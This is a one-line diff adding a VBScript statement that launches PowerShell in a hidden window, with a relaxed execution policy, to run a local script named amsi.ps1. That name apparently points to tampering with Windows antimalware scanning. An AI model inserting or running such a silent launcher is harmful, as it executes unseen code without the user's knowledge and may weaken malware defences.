@@ -1,0 +1,1 @@
+CreateObject("Wscript.Shell").Run "Powershell -executionpolicy remotesigned -File amsi.ps1",0,True
